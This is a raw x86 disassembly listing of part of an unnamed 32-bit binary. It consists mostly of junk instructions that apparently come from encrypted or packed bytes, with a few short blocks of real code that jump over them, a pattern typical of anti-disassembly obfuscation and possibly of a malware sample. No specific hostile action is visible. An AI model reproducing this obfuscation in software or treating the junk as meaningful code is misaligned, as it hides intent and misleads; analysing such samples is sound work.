  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021bd
  402176:	jmp    0xe56f:0x187becf5
  40217d:	or     DWORD PTR [ebp+0x6efb63f0],eax
  402183:	inc    esi
  402184:	pop    esi
  402185:	icebp  
  402186:	gs pop ebp
  402188:	fcmovb st,st(3)
  40218a:	nop
  40218b:	imul   esp,DWORD PTR [ecx+edi*4],0xffffff92
  40218f:	dec    ecx
  402190:	lahf   
  402191:	aas    
  402192:	mov    esp,ebx
  402194:	fsub   QWORD PTR [ebx]
  402196:	fcom   st(1)
  402198:	inc    ebx
  402199:	inc    ecx
  40219a:	mov    ecx,0x9ccc69f4
  40219f:	add    BYTE PTR [ebx-0x5cd0fbb4],bl
  4021a5:	xchg   edx,eax
  4021a6:	call   0x9656:0x667eb2f7
  4021ad:	adc    eax,0x420fcf80
  4021b2:	push   esp
  4021b3:	stc    
  4021b4:	mov    eax,0xb73b438
  4021b9:	adc    dl,BYTE PTR [ebp+0x5883f3cf]
  4021bf:	xchg   BYTE PTR [edi-0x61d4a344],ch
  4021c5:	mov    ds:0x6840eb01,eax
  4021ca:	mov    DWORD PTR [ebx-0x6e],edi
  4021cd:	(bad)  
  4021ce:	push   esi
  4021cf:	mov    cl,0x57
  4021d1:	jg     0x402177
  4021d3:	jbe    0x4021ee
  4021d5:	xor    cl,bh
  4021d7:	cmp    eax,0x5256cdd6
  4021dc:	lods   al,BYTE PTR ds:[esi]
  4021dd:	adc    BYTE PTR [ebx-0xa],dl
  4021e0:	push   ds
  4021e1:	push   ds
  4021e2:	mov    edx,0x317d5c1d
  4021e7:	cdq    
  4021e8:	fld    DWORD PTR [ebx-0x19]
  4021eb:	pop    es
  4021ec:	loop   0x40222a
  4021ee:	retf   
  4021ef:	lock and BYTE PTR [edi],ch
  4021f2:	xchg   ebp,eax
  4021f3:	cmp    eax,DWORD PTR [esi-0x29e37a38]
  4021f9:	cwde   
  4021fa:	and    ebx,DWORD PTR [ebp-0xd]
  4021fd:	test   al,0xa5
  4021ff:	test   al,0x31
  402201:	adc    DWORD PTR [edi-0x3c],esp
  402204:	sbb    eax,ecx
  402206:	inc    edx
  402207:	mov    dl,0x9d
  402209:	jmp    0x402247
  40220b:	rcl    esp,cl
  40220d:	sub    cl,BYTE PTR [edi]
  40220f:	fnsave ds:0x15b7540f
  402215:	call   0xbe4a:0x29cc651f
  40221c:	sbb    eax,0xc19899e8
  402221:	inc    ecx
  402222:	pop    edx
  402223:	dec    esp
  402224:	lods   al,BYTE PTR ds:[esi]
  402225:	or     dh,BYTE PTR [ebx+esi*8-0x27]
  402229:	pop    es
  40222a:	aaa    
  40222b:	xchg   ebx,eax
  40222c:	xchg   ebx,eax
  40222d:	test   edx,eax
  40222f:	in     al,dx
  402230:	push   edi
  402231:	xor    ebp,0xbdd59b92
  402237:	pusha  
  402238:	outs   dx,DWORD PTR ds:[esi]
  402239:	or     dh,BYTE PTR [ebp+0x10]
  40223c:	repz gs adc eax,0xd22be51d
  402243:	nop
  402244:	jmp    0x402242
  402246:	inc    esp
  402247:	mov    esp,0x5dc84c7c
  40224c:	push   edx
  40224d:	bswap  ebx
  40224f:	xlat   BYTE PTR ds:[ebx]
  402250:	mov    ebx,0x5e6357df
  402255:	aam    0x2d
  402257:	pusha  
  402258:	test   BYTE PTR [esp+eax*4+0x1e],0x25
  40225d:	sub    DWORD PTR [esi+0x2],0xffffffcc
  402261:	ficom  WORD PTR [ebx]
  402263:	and    BYTE PTR [ecx],dl
  402265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402266:	mov    DWORD PTR [eax+0x159ded31],ebp
  40226c:	lds    esp,FWORD PTR [esi+eiz*8]
  40226f:	lods   eax,DWORD PTR ds:[esi]
  402270:	fadd   DWORD PTR [edx]
  402272:	and    ch,0xbf
  402275:	retf   0x5a33
  402278:	mov    ds:0xbc19aed7,eax
  40227d:	fs popf 
  40227f:	data16 test BYTE PTR [ecx-0x47],cl
  402283:	fiadd  DWORD PTR [eax]
  402285:	cmp    esi,DWORD PTR [ecx+edx*1+0x4d]
  402289:	stos   DWORD PTR es:[edi],eax
  40228a:	das    
  40228b:	fadd   DWORD PTR [ecx-0x7a86ca40]
  402291:	mov    dh,0x53
  402293:	sbb    BYTE PTR [ecx+0x6f],ch
  402296:	sbb    ecx,edi
  402298:	out    dx,eax
  402299:	jo     0x4022d1
  40229b:	xor    dh,BYTE PTR [ebx]
  40229d:	jbe    0x4022af
  40229f:	adc    dh,al
  4022a1:	outs   dx,DWORD PTR ds:[esi]
  4022a2:	mov    ecx,0x26665c3e
  4022a7:	pop    esp
  4022a8:	out    0xbc,al
  4022aa:	cmp    dh,cl
  4022ac:	ds gs leave 
  4022af:	test   al,0xb0
  4022b1:	sub    eax,0xd3e85f06
  4022b6:	jge    0x4022b3
  4022b8:	push   edx
  4022b9:	or     eax,esp
  4022bb:	aam    0x7e
  4022bd:	mov    DWORD PTR [ebx+0x13a1eb48],ebp
  4022c3:	mov    bl,0x6d
  4022c5:	cs jmp 0x402298
  4022c8:	dec    edi
  4022c9:	loope  0x4022cf
  4022cb:	stos   BYTE PTR es:[edi],al
  4022cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022cd:	xchg   ecx,eax
  4022ce:	pminsw mm4,QWORD PTR ds:0x6970d217
  4022d5:	jne    0x402293
  4022d7:	xchg   ah,cl
  4022d9:	je     0x40226c
  4022db:	iret   
  4022dc:	mov    ah,BYTE PTR [eax+ecx*2+0xaec19d]
  4022e3:	(bad)  
  4022e4:	ds push edi
  4022e6:	cld    
  4022e7:	sub    eax,0x1b208832
  4022ec:	inc    edx
  4022ed:	xchg   esi,eax
  4022ee:	sbb    al,0xf8
  4022f0:	cs xchg esp,eax
  4022f2:	out    0x3c,al
  4022f4:	dec    ebx
  4022f5:	sbb    bl,BYTE PTR [edx-0x74afd67a]
  4022fb:	inc    ebp
  4022fc:	call   0x1d8a38c
  402301:	add    BYTE PTR [eax],al
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	cld    
  402358:	add    DWORD PTR [esi+0x17],0xffffff9a
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x402353
  402364:	pop    es
  402365:	xchg   DWORD PTR [ecx-0x3e],esp
  402368:	mov    dl,0x53
  40236a:	cld    
  40236b:	cmp    ecx,DWORD PTR [eax-0x19c59b7]
  402371:	jmp    0xb2fa6f5e
  402376:	mov    ecx,0xc8f1fb07
  40237b:	push   es
  40237c:	aam    0x61
  40237e:	and    eax,0xa259617e
  402383:	push   esp
  402384:	dec    edi
  402385:	lds    ebx,FWORD PTR [ecx-0x16712794]
  40238b:	pop    edx
  40238c:	iret   
  40238d:	mov    es,WORD PTR [esi+0x20]
  402390:	adc    DWORD PTR [edi+0x525ef1a6],edi
  402396:	pop    ebp
  402397:	mov    ds:0x1ed63959,al
  40239c:	mov    ds:0x787611ae,al
  4023a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023a2:	jmp    DWORD PTR [bp+di+0x52]
  4023a6:	sbb    cl,BYTE PTR [ebx+0x45]
  4023a9:	adc    dl,BYTE PTR [eax+edi*2]
  4023ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023ad:	(bad)  
  4023ae:	(bad)  
  4023af:	ficom  DWORD PTR [ecx+0x33d57f43]
  4023b5:	les    ebx,FWORD PTR [esi+0x1b451794]
  4023bb:	mov    edx,0x3700cc6d
  4023c0:	pop    edi
  4023c1:	je     0x4023fe
  4023c3:	in     eax,0xd5
  4023c5:	or     BYTE PTR [esi],al
  4023c7:	inc    ebp
  4023c8:	loopne 0x40243a
  4023ca:	cmp    DWORD PTR [eax+0x5],edi
  4023cd:	idiv   DWORD PTR [ebp-0x1f]
  4023d0:	lds    ebx,FWORD PTR [ecx+0x4c]
  4023d3:	and    al,BYTE PTR [esi+0x48]
  4023d6:	sub    eax,ecx
  4023d8:	sub    ch,BYTE PTR [ecx]
  4023da:	pop    es
  4023db:	in     al,0xfc
  4023dd:	dec    esp
  4023de:	pop    ecx
  4023df:	inc    eax
  4023e0:	ss pop ebx
  4023e2:	ret    
  4023e3:	iret   
  4023e4:	repnz push es
  4023e6:	es (bad) 
  4023e9:	pop    es
  4023ea:	xchg   esp,eax
  4023eb:	jne    0x4023e8
  4023ed:	and    esi,esi
  4023ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023f0:	cmp    edx,DWORD PTR [edi]
  4023f2:	dec    ecx
  4023f3:	sub    dl,BYTE PTR ds:0xcc708d8e
  4023f9:	add    edi,ebp
  4023fb:	dec    esp
  4023fc:	add    eax,DWORD PTR [eax-0x28]
  4023ff:	sbb    eax,0xceda2518
  402404:	push   ds
  402405:	dec    ebp
  402406:	jne    0x402393
  402408:	data16 lahf 
  40240a:	xchg   BYTE PTR [edx],bl
  40240c:	and    eax,0xae496f70
  402411:	mov    ecx,0x7583f717
  402416:	lahf   
  402417:	adc    BYTE PTR [ebx],ch
  402419:	pop    ebx
  40241a:	imul   BYTE PTR [edi-0x65]
  40241d:	(bad)  [ebx+0xb]
  402421:	cs out 0x33,al
  402424:	in     al,dx
  402425:	or     DWORD PTR [edx+0x79003125],ebx
  40242b:	pop    es
  40242c:	xchg   esi,eax
  40242d:	push   ds
  40242e:	sti    
  40242f:	cs fwait
  402431:	shl    DWORD PTR [eax+eax*8],cl
  402434:	mov    bl,0x8f
  402436:	and    dl,BYTE PTR [ebx-0x5cca4450]
  40243c:	aad    0x9a
  40243e:	or     DWORD PTR [eax+0x2fadf582],edi
  402444:	mov    ch,0x77
  402446:	fnstcw WORD PTR [ebp-0x24f9aa30]
  40244c:	pop    ss
  40244d:	es cmc 
  40244f:	inc    esi
  402450:	mov    ds:0xa0668511,al
  402455:	cld    
  402456:	sbb    eax,0xc1a8bfaa
  40245b:	call   0x81c0:0xd3f02c6e
  402462:	add    eax,0x5ef0ca3c
  402467:	mov    edx,0xc0931cbc
  40246c:	adc    eax,0xa20f276a
  402471:	mov    bl,0xf2
  402473:	cmp    ah,BYTE PTR [ebx-0x717f8c0b]
  402479:	mov    al,ds:0x95947de5
  40247e:	xor    eax,0x76527e06
  402483:	push   DWORD PTR [ebp-0x1f]
  402486:	fst    DWORD PTR [ecx-0x34]
  402489:	fdiv   QWORD PTR [edx-0xc7bca93]
  40248f:	push   ds
  402490:	mov    al,ds:0xea4c0f7d
  402495:	test   BYTE PTR [esp+ebp*1],0x57
  402499:	in     al,dx
  40249a:	call   0xb5de:0xa7638f68
  4024a1:	sbb    ah,BYTE PTR [edi]
  4024a3:	xchg   ebp,eax
  4024a4:	jns    0x4024f6
  4024a6:	sub    DWORD PTR [ebx*8-0x41e608ab],esi
  4024ad:	push   ebp
  4024ae:	ret    
  4024af:	mov    esp,0x3ad6a4e5
  4024b4:	fimul  DWORD PTR [edx]
  4024b6:	idiv   DWORD PTR [ebp+0x3c]
  4024b9:	fst    DWORD PTR [eax]
  4024bb:	repnz (bad) 
  4024bd:	sbb    ebp,DWORD PTR ds:0x504c876b
  4024c3:	in     eax,dx
  4024c4:	in     eax,0x14
  4024c6:	stos   DWORD PTR es:[edi],eax
  4024c7:	lahf   
  4024c8:	leave  
  4024c9:	add    DWORD PTR [edi+eax*8],ebx
  4024cc:	ret    0xa58c
  4024cf:	lods   eax,DWORD PTR ds:[esi]
  4024d0:	inc    edx
  4024d1:	or     DWORD PTR [edi-0x55],ebx
  4024d4:	popa   
  4024d5:	scas   al,BYTE PTR es:[edi]
  4024d6:	sub    ecx,ebx
  4024d8:	aam    0xbc
  4024da:	jge    0x4024d8
  4024dc:	xchg   ebp,eax
  4024dd:	jne    0x4024bf
  4024df:	adc    al,0x2
  4024e1:	in     al,dx
  4024e2:	cmp    ch,BYTE PTR [edi]
  4024e4:	sbb    al,0xce
  4024e6:	sub    cl,BYTE PTR [ebx+0x4589f045]
  4024ec:	lock mov eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	dec    edi
  40250e:	ds addr16 pop esp
  402511:	add    DWORD PTR es:[esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x40255a
  40251a:	lahf   
  40251b:	or     BYTE PTR [esi+0x7e],bl
  40251e:	out    0x53,al
  402520:	test   al,0x7e
  402522:	dec    edx
  402523:	push   es
  402524:	fisubr WORD PTR [edi-0x8c5e929]
  40252a:	and    BYTE PTR [edi+0x45f7ee31],bh
  402530:	in     eax,0x32
  402532:	ficom  DWORD PTR ds:0x3d6100dc
  402538:	xlat   BYTE PTR ds:[ebx]
  402539:	in     eax,0x77
  40253b:	inc    ecx
  40253c:	scas   eax,DWORD PTR es:[edi]
  40253d:	lea    esi,[ecx-0x33]
  402540:	sbb    BYTE PTR [ecx],0x4a
  402543:	rol    BYTE PTR ds:0xa85bf26d,cl
  402549:	dec    edi
  40254a:	(bad)  
  40254b:	pop    edi
  40254c:	mov    esp,0x17f035e6
  402551:	push   esi
  402552:	jle    0x402567
  402554:	sub    dh,BYTE PTR [ecx+0x1]
  402557:	push   esp
  402558:	dec    ebp
  402559:	cwde   
  40255a:	push   edx
  40255b:	push   ebx
  40255c:	sbb    al,0xbb
  40255e:	sysret 
  402560:	data16 es jns 0x40258d
  402564:	jmp    0x402503
  402566:	mov    bh,0xcc
  402568:	jmp    0x402594
  40256a:	aaa    
  40256b:	jle    0x40251c
  40256d:	push   ebp
  40256e:	(bad)  
  40256f:	mov    edi,0xd3c48f3f
  402574:	xor    BYTE PTR cs:[ebp-0x71],cl
  402578:	(bad)  
  402579:	jbe    0x402531
  40257b:	inc    eax
  40257c:	push   edi
  40257d:	cli    
  40257e:	mov    cl,0xca
  402580:	ja     0x40250b
  402582:	fwait
  402583:	mov    ?,WORD PTR [eax]
  402585:	std    
  402586:	adc    eax,0x88cd88cb
  40258b:	repnz sub esp,DWORD PTR ds:0xcb5d1ac2
  402592:	aaa    
  402593:	stc    
  402594:	lds    ebx,FWORD PTR [edx]
  402596:	hlt    
  402597:	mov    bh,0xbb
  402599:	outs   dx,DWORD PTR ds:[esi]
  40259a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40259b:	in     eax,0x1e
  40259d:	pop    edi
  40259e:	sbb    al,0x28
  4025a0:	dec    ecx
  4025a1:	mov    esi,0xcda66ccd
  4025a6:	sbb    ebp,DWORD PTR [edx]
  4025a8:	dec    edi
  4025a9:	pop    ds
  4025aa:	outs   dx,BYTE PTR ds:[esi]
  4025ab:	bound  esi,QWORD PTR [edx]
  4025ad:	cmp    al,0x2d
  4025af:	adc    DWORD PTR [ebx-0xc848fc],0x4bbbb94a
  4025b9:	xor    al,0x1a
  4025bb:	xor    edx,DWORD PTR [eax+eax*1]
  4025be:	mov    ss,WORD PTR [ecx+0x66]
  4025c1:	or     dh,0x4d
  4025c4:	sub    ebp,ebp
  4025c6:	pushf  
  4025c7:	gs or  eax,0x2ec6ba6
  4025cd:	hlt    
  4025ce:	push   ebp
  4025cf:	push   ebx
  4025d0:	ds out 0x56,al
  4025d3:	ror    BYTE PTR [ebx],0x71
  4025d6:	imul   ecx,DWORD PTR [edi+0x1d],0x82a2a5af
  4025dd:	pushf  
  4025de:	scas   eax,DWORD PTR es:[edi]
  4025df:	and    al,0x7c
  4025e1:	push   ecx
  4025e2:	add    BYTE PTR [eax+0x21],dl
  4025e5:	inc    ebx
  4025e6:	mov    esp,0xeac18922
  4025eb:	jnp    0x402632
  4025ed:	dec    ebx
  4025ee:	mov    ebp,0xc3cf1ba6
  4025f3:	push   edx
  4025f4:	and    eax,0x1ba1d6d7
  4025f9:	hlt    
  4025fa:	mov    ebx,ecx
  4025fc:	push   edi
  4025fd:	sbb    DWORD PTR [ebp-0x34],edx
  402600:	mov    ss,edx
  402602:	and    ecx,DWORD PTR [edi-0x3a]
  402605:	int3   
  402606:	out    dx,al
  402607:	lahf   
  402608:	sub    al,BYTE PTR [ebp-0x69]
  40260b:	popa   
  40260c:	fadd   QWORD PTR [ecx+ebp*4-0x6a]
  402610:	call   0x9e2cf4c
  402615:	cmp    ch,BYTE PTR [eax+0x13dd5cdf]
  40261b:	jl     0x4025a5
  40261d:	loope  0x40264a
  40261f:	stc    
  402620:	fstp   TBYTE PTR [ebp+0x3a6da087]
  402626:	sbb    cl,BYTE PTR [eax-0x6df5dc19]
  40262c:	jae    0x402682
  40262e:	pop    es
  40262f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402630:	dec    esi
  402631:	fwait
  402632:	jo     0x40262c
  402634:	hlt    
  402635:	std    
  402636:	rol    BYTE PTR [ebx-0x1cf19a41],1
  40263c:	cmp    al,0x8
  40263e:	into   
  40263f:	jl     0x402604
  402641:	retf   0xd137
  402644:	cmp    eax,DWORD PTR ss:[bp+si+0x27c7]
  40264a:	mov    edi,0x48677b3
  40264f:	dec    ecx
  402650:	int    0x30
  402652:	mov    BYTE PTR [ebp-0x36],ah
  402655:	sysret 
  402657:	add    edi,ebx
  402659:	dec    ebx
  40265a:	xor    edx,esp
  40265c:	xor    DWORD PTR [ebp-0xf],ebx
  40265f:	push   ebx
  402660:	and    ebx,DWORD PTR [edx]
  402662:	gs stos BYTE PTR es:[edi],al
  402664:	add    BYTE PTR [esi+0x698744fc],0x97
  40266b:	dec    ebx
  40266c:	out    0x97,al
  40266e:	test   BYTE PTR [eax],bh
  402670:	xchg   edx,eax
  402671:	mov    bh,0xd
  402673:	jo     0x4026ae
  402675:	push   ds
  402676:	jg     0x402690
  402678:	xrelease xchg BYTE PTR [ebx+0x79],ah
  40267c:	imul   edx,DWORD PTR [ebp-0x37a3c56],0xa44958c1
  402686:	cli    
  402687:	aad    0xa9
  402689:	enter  0xdbd9,0x5e
  40268d:	push   ss
  40268e:	popf   
  40268f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402690:	pushf  
  402691:	ins    DWORD PTR es:[edi],dx
  402692:	adc    al,0x78
  402694:	lea    edx,ds:0x77ffc527
  40269a:	or     BYTE PTR [edx],ah
  40269c:	push   DWORD PTR [ebx]
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	mov    bh,0x85
  4026d4:	popa   
  4026d5:	adc    ah,BYTE PTR [edx-0x58181f2]
  4026db:	jg     0x40275b
  4026dd:	jle    0x402660
  4026df:	lods   eax,DWORD PTR ds:[esi]
  4026e0:	retf   0x86f6
  4026e3:	or     DWORD PTR [esi-0x67],edi
  4026e6:	xchg   ebx,eax
  4026e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026e8:	outs   dx,DWORD PTR ds:[esi]
  4026e9:	frstor [esi-0x4da73bd3]
  4026ef:	dec    edi
  4026f0:	fsub   QWORD PTR [eax]
  4026f2:	pop    esp
  4026f3:	push   0x5f52abf7
  4026f8:	inc    esp
  4026f9:	les    eax,FWORD PTR fs:[eax-0x80]
  4026fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026fe:	and    DWORD PTR [edi+0xcad3d3d],0xb3b92743
  402708:	pop    edi
  402709:	jg     0x4026bb
  40270b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40270c:	shr    DWORD PTR [esi+0x62],0xdf
  402710:	(bad)  
  402711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402712:	jle    0x402704
  402714:	je     0x402751
  402716:	and    bl,BYTE PTR [ecx+0x45]
  402719:	push   0x9e95c59a
  40271e:	jnp    0x402765
  402720:	sbb    edi,ebp
  402722:	test   DWORD PTR [edx+edx*2-0x14981f69],edx
  402729:	outs   dx,BYTE PTR ds:[esi]
  40272a:	and    al,ch
  40272c:	or     ah,al
  40272e:	es (bad) 
  402730:	jo     0x402771
  402732:	jmp    FWORD PTR [edx-0x35]
  402735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402736:	sub    al,0xa1
  402738:	mov    edi,0x9b62315d
  40273d:	rcl    DWORD PTR [esi-0x72],0x10
  402741:	xchg   edi,eax
  402742:	popf   
  402743:	sub    DWORD PTR [ecx+esi*4+0x54],esi
  402747:	sbb    eax,0xc4bc647d
  40274c:	push   ecx
  40274d:	mov    ebx,DWORD PTR ds:0x2599c072
  402753:	lahf   
  402754:	bnd ja 0x40271f
  402757:	mov    ebp,0x1c55ba44
  40275c:	std    
  40275d:	jo     0x4027db
  40275f:	test   eax,0x59cbd24
  402764:	push   ebx
  402765:	push   esp
  402766:	mov    ebp,0x8c37522a
  40276b:	popa   
  40276c:	les    cx,DWORD PTR [edi]
  40276f:	xchg   edx,eax
  402770:	mov    al,0xcd
  402772:	or     bl,dh
  402774:	pop    edx
  402775:	xchg   esp,eax
  402776:	scas   al,BYTE PTR es:[edi]
  402777:	inc    esi
  402778:	enter  0x1b16,0x90
  40277c:	in     eax,dx
  40277d:	mov    DWORD PTR [edi-0x7c],edx
  402780:	aam    0x74
  402782:	push   0x33
  402784:	jle    0x402743
  402786:	rcl    BYTE PTR [eax+0x62],cl
  402789:	pusha  
  40278a:	or     eax,0x633fedd0
  40278f:	xchg   edx,eax
  402790:	xchg   esi,eax
  402791:	ror    BYTE PTR [edi-0x1de7837e],cl
  402797:	mov    edx,0xcc94a4ea
  40279c:	mov    gs,WORD PTR [ebx+0x5d343869]
  4027a2:	add    ebx,esp
  4027a4:	or     al,cl
  4027a6:	lods   eax,DWORD PTR ds:[esi]
  4027a7:	and    dl,dh
  4027a9:	push   ecx
  4027aa:	fist   WORD PTR [edi+0x64]
  4027ad:	adc    eax,0x5f3e0021
  4027b2:	adc    DWORD PTR [ebx-0xd02fc82],esp
  4027b8:	fisub  WORD PTR [ebx+0x5d3a4aea]
  4027be:	icebp  
  4027bf:	inc    edx
  4027c0:	jle    0x4027c0
  4027c2:	mov    dl,0x8
  4027c4:	ins    BYTE PTR es:[edi],dx
  4027c5:	dec    ebx
  4027c6:	popa   
  4027c7:	cmp    DWORD PTR [edx],eax
  4027c9:	sub    eax,0xb596da69
  4027ce:	xchg   edx,eax
  4027cf:	push   0x48
  4027d1:	in     al,0xf6
  4027d3:	and    eax,0x5ba5ee1a
  4027d8:	jl     0x40280e
  4027da:	jecxz  0x402840
  4027dc:	outs   dx,DWORD PTR ds:[esi]
  4027dd:	shr    DWORD PTR [ebp+0x60],1
  4027e0:	jg     0x402860
  4027e2:	ror    edi,1
  4027e4:	mov    dh,0x56
  4027e6:	shr    BYTE PTR [edx-0x77],1
  4027e9:	into   
  4027ea:	stos   DWORD PTR es:[edi],eax
  4027eb:	sub    eax,0x661623c9
  4027f0:	cld    
  4027f1:	leave  
  4027f2:	jg     0x402800
  4027f4:	fistp  WORD PTR [ecx]
  4027f6:	mov    al,0x86
  4027f8:	xor    ebp,ecx
  4027fa:	cmp    cl,dh
  4027fc:	sbb    esp,DWORD PTR [eax-0x749ab9b2]
  402802:	jne    0x4027c2
  402804:	or     al,0x7a
  402806:	push   ebp
  402807:	or     DWORD PTR [eax],edi
  402809:	shl    DWORD PTR [ebx],cl
  40280b:	cmp    DWORD PTR [ebx-0x5bbae556],edx
  402811:	int    0xe5
  402813:	mov    ebp,0x9832fb3d
  402818:	jle    0x402815
  40281a:	push   eax
  40281b:	and    DWORD PTR [ecx],ebx
  40281d:	push   cs
  40281e:	jbe    0x4027ab
  402820:	pop    esp
  402821:	icebp  
  402822:	cdq    
  402823:	mov    edx,?
  402825:	mov    bh,BYTE PTR [ecx]
  402827:	jg     0x402836
  402829:	cli    
  40282a:	adc    eax,0x91945776
  40282f:	adc    ebx,DWORD PTR [eax+0x5f]
  402832:	pop    edi
  402833:	dec    edx
  402834:	arpl   WORD PTR [ebp-0x7f],ax
  402837:	imul   ebx,DWORD PTR [ebp-0x25b3929c],0x78
  40283e:	aad    0x81
  402840:	jb     0x4027e2
  402842:	xchg   esp,eax
  402843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402844:	out    dx,eax
  402845:	mul    DWORD PTR ds:0x80c664d6
  40284b:	xor    eax,0xa4e85ae0
  402850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402851:	(bad)  
  402852:	fidiv  DWORD PTR [edx+0x79]
  402855:	or     al,0xcf
  402857:	mov    bh,0xf1
  402859:	arpl   WORD PTR [ecx-0x8702fbb],si
  40285f:	loopne 0x4028b2
  402861:	scas   al,BYTE PTR es:[edi]
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	fidiv  WORD PTR [ebx+0x7c]
  402886:	enter  0xc2e,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402885
  402890:	xchg   edx,eax
  402891:	adc    BYTE PTR [esi],bh
  402893:	(bad)  
  402894:	scas   al,BYTE PTR es:[edi]
  402895:	mov    WORD PTR [esi],es
  402897:	imul   edx,DWORD PTR ds:0x28da911a,0xffffffd9
  40289e:	add    DWORD PTR [ebp-0x12],esi
  4028a1:	iret   
  4028a2:	scas   al,BYTE PTR es:[edi]
  4028a3:	mov    bh,0xfb
  4028a5:	(bad)  
  4028a7:	sub    al,0x70
  4028a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028aa:	outs   dx,BYTE PTR ds:[esi]
  4028ab:	call   0x9ecab513
  4028b0:	sub    ebp,DWORD PTR ss:[ebx+0x462a9e94]
  4028b7:	test   eax,0x1f270d61
  4028bc:	loope  0x40284f
  4028be:	(bad)  
  4028bf:	rol    BYTE PTR [eax],0x1e
  4028c2:	cmp    DWORD PTR [edx+eiz*4],eax
  4028c5:	inc    esi
  4028c6:	daa    
  4028c7:	dec    ebx
  4028c8:	push   esp
  4028c9:	jp     0x4028e2
  4028cb:	pop    ebx
  4028cc:	fst    QWORD PTR [edx+0x3d942522]
  4028d2:	imul   eax,DWORD PTR [edx-0x521fc435],0x4b
  4028d9:	dec    ebx
  4028da:	cdq    
  4028db:	sbb    ebp,ebx
  4028dd:	dec    edi
  4028de:	ror    BYTE PTR [eax],1
  4028e0:	cmp    al,0x91
  4028e2:	arpl   di,bx
  4028e4:	rcl    BYTE PTR [ecx+0x19],0x76
  4028e8:	add    al,0xce
  4028ea:	das    
  4028eb:	xlat   BYTE PTR ds:[ebx]
  4028ec:	in     al,dx
  4028ed:	test   eax,0x87bb8d7f
  4028f2:	pop    ss
  4028f3:	or     eax,ebx
  4028f5:	out    dx,al
  4028f6:	inc    edx
  4028f7:	shl    DWORD PTR [esi+edi*8-0x1c],cl
  4028fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028fc:	aas    
  4028fd:	out    0xdd,eax
  4028ff:	aas    
  402900:	cdq    
  402901:	mov    ds,WORD PTR [ebx-0x6b5ae9a7]
  402907:	ss push ebx
  402909:	mov    ch,0xd8
  40290b:	xlat   BYTE PTR ds:[ebx]
  40290c:	mov    edx,0x9b3c1fcd
  402911:	add    DWORD PTR [ecx-0x47],0x4e
  402915:	fidiv  DWORD PTR [ecx]
  402917:	inc    DWORD PTR [esi]
